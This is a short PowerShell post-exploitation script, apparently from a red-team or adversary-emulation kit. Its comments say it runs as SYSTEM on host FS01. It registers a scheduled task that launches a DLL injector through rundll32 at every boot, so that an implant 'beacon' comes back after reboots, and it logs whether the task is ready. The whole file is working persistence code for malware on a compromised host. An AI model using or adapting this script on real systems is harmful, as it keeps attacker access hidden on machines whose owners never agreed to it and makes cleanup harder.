# persist-task.ps1 - creates boot persistence from the payload, not in the image.
# Runs as SYSTEM on FS01; the task starts the injector at boot so the beacon returns after a reboot.

$log = 'C:\ProgramData\c0015\persist.log'
function W($m) { Add-Content -LiteralPath $log -Value ("{0} {1}" -f (Get-Date -Format 'HH:mm:ss'), $m) }

W "=== persist start as $(whoami) ==="
$cmd = 'rundll32.exe C:\ProgramData\143.dll,Run'
schtasks /create /tn C0015Persist /tr "$cmd" /sc onstart /ru SYSTEM /rl HIGHEST /f | Out-Null
$q = schtasks /query /tn C0015Persist /fo list 2>&1
W ($q -join ' ')
if ($q -match 'Ready|Running') { W '=== persist ready ===' } else { W '=== persist failed ===' }
